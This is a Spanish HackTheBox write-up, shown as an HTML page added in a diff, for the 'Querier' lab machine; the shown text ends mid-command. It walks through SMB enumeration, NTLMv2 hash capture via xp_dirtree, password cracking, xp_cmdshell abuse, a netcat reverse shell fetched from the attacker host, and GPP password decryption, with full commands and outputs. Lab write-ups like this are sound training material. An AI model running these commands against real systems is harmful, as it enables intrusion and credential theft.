@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Querier</title>
+
+  <meta name="description" content="Resolución de la máquina Querier de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Querier">
+  <meta name="twitter:description" content="Resolución de la máquina Querier de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/querier.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Querier">
+  <meta property="og:description" content="Resolución de la máquina Querier de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/querier.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/querier.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Querier" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-mssql-svc">Shell - mssql-svc</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#altern-administrator">Alternativa - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/querier.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Querier</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos con servicios como <code class="language-plaintext highlighter-rouge">smb</code>, <code class="language-plaintext highlighter-rouge">mssql</code> y <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.125
+Nmap scan report for 10.10.10.125  
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+1433/tcp  open  ms-sql-s
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si enumeramos un poco de información con <code class="language-plaintext highlighter-rouge">crackmapexec</code> en SMB nos encontramos con que el nombre de la máquina es <code class="language-plaintext highlighter-rouge">QUERIER</code> que pertenece al dominio <code class="language-plaintext highlighter-rouge">htb.local</code><p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.125
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al intentar listar los recursos compartidos como el usuario <code class="language-plaintext highlighter-rouge">null</code> sin contraseña nos devuvelve que no encuentra el servidor para autenticarse que seria el <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.125 -u null -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="ro">[-] </span><span class="p">HTB.LOCAL\null: STATUS_NO_LOGON_SERVERS</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar el parametro <code class="language-plaintext highlighter-rouge">--local-auth</code> para usar autenticacion a nivel <code class="language-plaintext highlighter-rouge">local</code> y no de <code class="language-plaintext highlighter-rouge">dominio</code> ya que esta no funciona, al hacerlo podemos ver un recurso <code class="language-plaintext highlighter-rouge">Reports</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.125 -u null -p </span><span class="am">''</span><span class="p"> --shares --local-auth
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="ve">[+] </span><span class="p">QUERIER\null:
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="am">Reports         READ</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">smbclient</code> nos conectarmos al recurso <code class="language-plaintext highlighter-rouge">Reports</code> como el usuario <code class="language-plaintext highlighter-rouge">null</code> sin contraseña, en el encontramos solo un archivo <code class="language-plaintext highlighter-rouge">xlsm</code> asi que lo descargamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">WORKGROUP/null@10.10.10.125 -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use Reports
+# ls
+drw-rw-rw-          0  Mon Jan 28 18:26:31 2019 .
+drw-rw-rw-          0  Mon Jan 28 18:26:31 2019 ..
+-rw-rw-rw-      12229  Mon Jan 28 18:26:31 2019 Currency Volume Report.xlsm  
+# get Currency Volume Report.xlsm
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir el archivo <code class="language-plaintext highlighter-rouge">xlsm</code> con <code class="language-plaintext highlighter-rouge">LibreOffice</code> encontramos un archivo vacio</p>
+<a href="/htb/querier/1.png" target="_blank"><div><p><img src="/htb/querier/1.png"></p></div></a>
+
+<p class="plain-text">Podemos ver si existen <code class="language-plaintext highlighter-rouge">macros</code> existentes en este archivo en <code class="language-plaintext highlighter-rouge">Tools > Macros</code></p>
+<a href="/htb/querier/2.png" target="_blank"><div><p><img src="/htb/querier/2.png"></p></div></a>
+
+<p class="plain-text">En el archivo existe una macro <code class="language-plaintext highlighter-rouge">ThisWorkbook</code> que tiene una funcion <code class="language-plaintext highlighter-rouge">Connect()</code></p>
+<a href="/htb/querier/3.png" target="_blank"><div><p><img src="/htb/querier/3.png"></p></div></a>
+
+<p class="plain-text">Esta define las credenciales del usuario <code class="language-plaintext highlighter-rouge">reporting</code> para conectarse a <code class="language-plaintext highlighter-rouge">MSSQL</code> y mediante una query leer el contenido de las columnas existentes en la tabla <code class="language-plaintext highlighter-rouge">volume</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">Rem Attribute VBA_ModuleType=VBADocumentModule
+</span><span class="na">Option </span><span class="p">VBASupport </span><span class="mi">1</span><span class="p">
+</span><span class="c1">
+' macro to pull data for client volume reports
+'
+' further testing required
+</span><span class="p">
+</span><span class="na">Private </span><span class="p">Sub Connect()
+
+</span><span class="no">Dim </span><span class="p">conn As ADODB.Connection
+</span><span class="no">Dim </span><span class="p">rs As ADODB.Recordset
+
+</span><span class="no">Set </span><span class="p">conn </span><span class="o">= </span><span class="no">New </span><span class="p">ADODB.Connection
+conn.ConnectionString </span><span class="o">= </span><span class="s">"Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"  </span><span class="p">
+conn.ConnectionTimeout </span><span class="o">= </span><span class="mi">10</span><span class="p">
+conn.Open
+
+</span><span class="o">If </span><span class="p">conn.State </span><span class="o">= </span><span class="p">adStateOpen </span><span class="o">Then</span><span class="p">
+</span><span class="c1">
+  ' MsgBox "connection successful"
+
+  'Set rs = conn.Execute("SELECT * @@version;")
+  </span><span class="no">Set </span><span class="p">rs </span><span class="o">= </span><span class="p">conn.Execute(</span><span class="s">"SELECT * FROM volume;"</span><span class="p">)
+  Sheets(</span><span class="mi">1</span><span class="p">).Range(</span><span class="s">"A1"</span><span class="p">).CopyFromRecordset rs
+  rs.Close
+
+</span><span class="o">End </span><span class="p">If
+
+</span><span class="o">End </span><span class="p">Sub</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-mssql-svc">
+<br><h3 class="post-title">Shell - mssql-svc</h3><br>
+
+<p class="plain-text">Podemos comprobar las credenciales con <code class="language-plaintext highlighter-rouge">crackmapexec</code> en autenticacion local</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.125 -u reporting -p </span><span class="am">'PcwTWTHRwryjc$c6'</span><span class="p"> --local-auth
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="ve">[+] </span><span class="p">QUERIER\reporting:PcwTWTHRwryjc$c6</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que en la macro se usan para eso nos conectaremos a <code class="language-plaintext highlighter-rouge">mssql</code> agregando el parametro <code class="language-plaintext highlighter-rouge">-windows-auth</code> ya que no es una autenticacion de <code class="language-plaintext highlighter-rouge">sql</code> sino de <code class="language-plaintext highlighter-rouge">windows</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">WORKGROUP/reporting:</span><span class="am">'PcwTWTHRwryjc$c6'</span><span class="p">@10.10.10.125 -windows-auth  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si intentamos habilitar el modulo <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> nos dice que no tenemos permisos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> enable_xp_cmdshell
+[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.  
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ejecutar <code class="language-plaintext highlighter-rouge">xp_dirtree</code> dentro de mssql, para poder capturar la autenticacion crearemos un servidor smb usando la herramienta <code class="language-plaintext highlighter-rouge">smbserver</code> de impacket</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usando <code class="language-plaintext highlighter-rouge">xp_dirtree</code> podemos hacer una petición al servidor <code class="language-plaintext highlighter-rouge">smb</code> que creamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_dirtree '\\10.10.14.10\kali'
+
+subdirectory                           depth
+------------------------------------   ---------------------------------  
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la petición se tramita una <code class="language-plaintext highlighter-rouge">autenticación</code> la cual nuestro servidor <code class="language-plaintext highlighter-rouge">smb</code> intercepta y se traduce en un hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> en este caso perteneciente al usuario <code class="language-plaintext highlighter-rouge">mssql-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.125,49675)
+[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
+[*] User QUERIER\mssql-svc authenticated successfully
+[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:1b8ac10f2ee096c04f0a953cc0e057a2:0101000000000000006e16f68ea7d901f2aa2691f0e877e100000000010010005700590069006700590045004100680003001000570059006900670059004500410068000200100059005400560052006700710065004c000400100059005400560052006700710065004c0007000800006e16f68ea7d90106000400020000000800300030000000000000000000000000300000ad7f5ab21619b2c8cf9a2feda9274e97076220880de0204c352e231f9ce2b88d0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310035003500000000000000000000000000  
+[*] Closing down connection (10.10.10.125,49675)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">john</code> podemos pasarle el hash y obtener la contraseña de <code class="language-plaintext highlighter-rouge">mssql-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">corporate568</span><span class="p">     (</span><span class="am">mssql-svc</span><span class="p">)
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente podemos comprobarla con <code class="language-plaintext highlighter-rouge">crackmapexec</code> en una autenticacion <code class="language-plaintext highlighter-rouge">local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.125 -u mssql-svc -p corporate568 --local-auth
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="ve">[+] </span><span class="p">QUERIER\mssql-svc:corporate568</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con las credenciales de <code class="language-plaintext highlighter-rouge">mssql-svc</code> tambien podemos conectarnos a <code class="language-plaintext highlighter-rouge">mssql</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">WORKGROUP/mssql-svc:corporate568@10.10.10.125 -windows-auth  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos los usuarios que son <code class="language-plaintext highlighter-rouge">administradores</code> sobre mssql nos encontramos con varias cuentas de <code class="language-plaintext highlighter-rouge">servicio</code> ademas del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y <code class="language-plaintext highlighter-rouge">mssql-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from syslogins where sysadmin = '1';
+
+name
+--------------------------------------------------------------------------  
+
+sa
+QUERIER\Administrator
+NT SERVICE\SQLWriter
+NT SERVICE\Winmgmt
+NT Service\MSSQLSERVER
+NT SERVICE\SQLSERVERAGENT
+QUERIER\mssql-svc
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos privilegios de <code class="language-plaintext highlighter-rouge">administrador</code> lo que nos permite habilitar el modulo <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> y ejecutar comandos, en este caso lo hacemos como <code class="language-plaintext highlighter-rouge">mssql-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> enable_xp_cmdshell
+[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
+[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> xp_cmdshell whoami
+
+output
+--------------------------------------------------------------------------
+
+querier\mssql-svc
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener una shell descargamos <code class="language-plaintext highlighter-rouge">netcat.exe</code> de nuestra maquina y lo guardamos en el directorio <code class="language-plaintext highlighter-rouge">ProgramData</code>, despues nos enviamos una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro host</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell curl 10.10.14.10/netcat.exe -o C:\ProgramData\netcat.exe
+
+output
+--------------------------------------------------------------------------  
+
+SQL>
+
+
+SQL> xp_cmdshell C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En nuestro listener recibimos una shell como <code class="language-plaintext highlighter-rouge">mssql-svc</code> y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.125 
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+querier\mssql-svc
+PS C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\mssql-svc\Desktop\user.txt  
+59b**************************c3a
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Para escalar privilegios usaremos el modulo <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a>, lo descargamos en la maquina y lo importamos a <code class="language-plaintext highlighter-rouge">powershell</code> usando el comando <code class="language-plaintext highlighter-rouge">Importe-Module</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\mssql-svc\Desktop> </span><span class="am">curl </span><span class="p">10.10.14.10/PowerUp.ps1 </span><span class="c1">-o </span><span class="p">PowerUp.ps1  
+PS C:\Users\mssql-svc\Desktop> </span><span class="am">Import-Module</span><span class="p"> .\PowerUp.ps1
+PS C:\Users\mssql-svc\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora para buscar formas de <code class="language-plaintext highlighter-rouge">escalar</code> invocamos el modulo y busca varias vias</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\mssql-svc\Desktop> </span><span class="am">Invoke-AllChecks</span><span class="p">
+
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 2212
+ProcessId   : 192
+Name        : 192
+Check       : Process Token Privileges
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services
+
+ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+IdentityReference : QUERIER\mssql-svc
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+Name         : C:\Windows\Panther\Unattend.xml
+Check        : Unattended Install Files
+
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml  
+Check     : Cached GPP Files
+
+PS C:\Users\mssql-svc\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al terminar el comando nos muestra que ha encontrado una contraseña para <code class="language-plaintext highlighter-rouge">Administrator</code> en un archivo <code class="language-plaintext highlighter-rouge">GPP</code>, la cual nos la muestra en texto claro</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml  
+Check     : Cached GPP Files</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque ya nos la muestra en texto claro si leemos el archivo nos muestra un archivo <code class="language-plaintext highlighter-rouge">xml</code> con un campo <code class="language-plaintext highlighter-rouge">cpassword</code> el cual podemos desencriptar con <code class="language-plaintext highlighter-rouge">gpp-decrypt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\mssql-svc\Desktop> </span><span class="am">type </span><span class="az">'C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml'</span><span class="p">
+&lt?xml version="1.0" encoding="UTF-8" ?>&ltGroups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+&ltUser clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">
+&ltProperties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator">&lt/Properties>&lt/User>&lt/Groups>  
+PS C:\Users\mssql-svc\Desktop></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gpp-decrypt </span><span class="p">CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ  
+MyUnclesAreMarioAndLuigi!!1!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al comprobarla localmente con <code class="language-plaintext highlighter-rouge">crackmapexec</code> esta credencial devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.125 -u Administrator -p </span><span class="am">'MyUnclesAreMarioAndLuigi!!1!'</span><span class="p"> --local-auth
